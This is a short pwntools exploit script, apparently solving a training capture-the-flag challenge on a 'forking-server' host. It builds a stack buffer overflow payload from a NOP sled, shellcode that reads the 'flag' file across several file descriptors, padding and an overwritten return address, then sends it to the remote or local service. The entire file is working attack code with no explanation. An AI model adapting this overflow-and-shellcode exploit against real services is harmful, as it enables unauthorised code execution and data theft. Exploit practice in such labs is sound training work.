from pwn import *
import time

context.arch = "amd64"


for i in range(3,11):

    if args.REMOTE:
        c = remote("forking-server.training.offensivedefensive.it", 8080, ssl=True)
    else:
        c = remote("127.0.0.1",4000)

    c.recvuntil(b"What is your name?\n")

    buffer_addr = 0x404100
    buffer_size = 1016 # cyclic

    shellcode = asm(shellcraft.amd64.linux.cat("flag", fd=i))
    shellcode_size = len(shellcode)

    payload = b"\x90" * 100
    payload += shellcode
    payload += b"A" * (buffer_size - shellcode_size - 100)
    payload += p64(buffer_addr)

    print(len(payload))

    c.sendline(payload)
    print(c.recvall())
    time.sleep(1)